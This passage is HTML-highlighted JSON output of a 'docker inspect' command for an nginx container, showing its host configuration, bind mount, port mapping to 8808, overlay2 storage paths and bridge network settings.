class="string">&quot;sha256:e35ad067421ccda484ee30e4ccc8a38fa13f9a21dd8d356e495c2d3a1f0766e9&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ResolvConfPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/containers/bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84/resolv.conf&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;HostnamePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/containers/bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84/hostname&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;HostsPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/containers/bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LogPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/containers/bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84/bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84-json.log&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/vigilant_borg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;RestartCount&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Driver&quot;</span><span class="punctuation">:</span> <span class="string">&quot;overlay2&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Platform&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;MountLabel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ProcessLabel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AppArmorProfile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ExecIDs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;HostConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Binds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/var/www/html:/usr/share/nginx/html&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ContainerIDFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;LogConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;json-file&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;NetworkMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bridge&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PortBindings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;HostIp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HostPort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8808&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;RestartPolicy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;no&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;MaximumRetryCount&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AutoRemove&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;VolumeDriver&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;VolumesFrom&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ConsoleSize&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="number">58</span><span class="punctuation">,</span></span><br><span class="line">                <span class="number">181</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CapAdd&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CapDrop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CgroupnsMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Dns&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;DnsOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;DnsSearch&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ExtraHosts&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;GroupAdd&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;IpcMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Cgroup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Links&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OomScoreAdj&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PidMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Privileged&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublishAllPorts&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ReadonlyRootfs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;SecurityOpt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;UTSMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;UsernsMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ShmSize&quot;</span><span class="punctuation">:</span> <span class="number">67108864</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Runtime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;runc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Isolation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuShares&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Memory&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;NanoCpus&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CgroupParent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;BlkioWeight&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;BlkioWeightDevice&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;BlkioDeviceReadBps&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;BlkioDeviceWriteBps&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;BlkioDeviceReadIOps&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;BlkioDeviceWriteIOps&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuPeriod&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuQuota&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuRealtimePeriod&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuRealtimeRuntime&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpusetCpus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpusetMems&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Devices&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;DeviceCgroupRules&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;DeviceRequests&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MemoryReservation&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MemorySwap&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MemorySwappiness&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OomKillDisable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PidsLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Ulimits&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuCount&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;CpuPercent&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;IOMaximumIOps&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;IOMaximumBandwidth&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MaskedPaths&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/proc/asound&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/acpi&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/interrupts&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/kcore&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/keys&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/latency_stats&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/timer_list&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/timer_stats&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/sched_debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/scsi&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/sys/firmware&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/sys/devices/virtual/powercap&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ReadonlyPaths&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/proc/bus&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/fs&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/irq&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/sys&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/proc/sysrq-trigger&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;GraphDriver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;ID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bb0ed63e5343b2909ade17a4d7b32f57e64fb9cb3a62d8f09ae5194fb6e2ec84&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;LowerDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/overlay2/07123433d3bfec54ce8040ac5c2d199fb869565625feddac5f55fa88febb88c5-init/diff:/var/lib/docker/overlay2/a841d7cc6dbd360ec86c65719cd553de3162c63f953e360b98a93ca960a809f2/diff:/var/lib/docker/overlay2/507b47b365b164b1aed7b0ab3e1da800ab8667b092dc76248f4eed98668e63ed/diff:/var/lib/docker/overlay2/3eae315eea97056adfa325f8b9b9960342f2364fa187dcc8c3aa7ceb3aa82283/diff:/var/lib/docker/overlay2/598206e548e877607b956cbf850b2468ac21a3c581ba7da21f10d238637342d6/diff:/var/lib/docker/overlay2/a4cd7986d0dfd2c0ce129bf6d7b82bae911b68055e40b85487525a6a14fbc03c/diff:/var/lib/docker/overlay2/7629fc3bcabfa1a617d52d57efb158bed7843c7df6a5fc5e96ce0d479d5f9fe3/diff:/var/lib/docker/overlay2/3b7137bcd7b4a21bb55d80bdcfad703f6e1fcbf3c45a1e6181bcda5407caaec7/diff&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;MergedDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/overlay2/07123433d3bfec54ce8040ac5c2d199fb869565625feddac5f55fa88febb88c5/merged&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;UpperDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/overlay2/07123433d3bfec54ce8040ac5c2d199fb869565625feddac5f55fa88febb88c5/diff&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;WorkDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker/overlay2/07123433d3bfec54ce8040ac5c2d199fb869565625feddac5f55fa88febb88c5/work&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;overlay2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Mounts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bind&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/www/html&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/share/nginx/html&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;RW&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Propagation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rprivate&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bb0ed63e5343&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;NGINX_VERSION=1.29.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;NJS_VERSION=0.9.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;NJS_RELEASE=1~trixie&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;PKG_RELEASE=1~trixie&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;DYNPKG_RELEASE=1~trixie&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;nginx&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;daemon off;&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nginx&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/docker-entrypoint.sh&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;maintainer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;StopSignal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SIGQUIT&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NetworkSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Bridge&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;SandboxID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8a0d9187a47cd105f6c5c35ba9506f0d2173399c6dac16b6a9ac2a59839b8974&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;SandboxKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/run/docker/netns/8a0d9187a47c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Ports&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;HostIp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HostPort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8808&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;HostIp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;::&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;HostPort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8808&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;HairpinMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;LinkLocalIPv6Address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;LinkLocalIPv6PrefixLen&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;SecondaryIPAddresses&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;SecondaryIPv6Addresses&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;EndpointID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;493a0f10dd4b30e9523175860148528075582b9346d4580d162dd055ab1a6feb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Gateway&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.17.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;GlobalIPv6Address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;GlobalIPv6PrefixLen&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;IPAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.17.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;IPPrefixLen&quot;</span><span class="punctuation">:</span> <span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;IPv6Gateway&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MacAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ce:9f:06:10:38:a2&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Networks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;bridge&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;IPAMConfig&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Links&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Aliases&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;MacAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ce:9f:06:10:38:a2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;DriverOpts&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;GwPriority&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;NetworkID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c52144245f92e7306bd6ed8172b3f6a52c2175bf23448794418d0ae3a9bb1981&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;EndpointID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;493a0f10dd4b30e9523175860148528075582b9346d4580d162dd055ab1a6feb&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Gateway&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.17.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;IPAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.17.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;IPPrefixLen&quot;</span><span 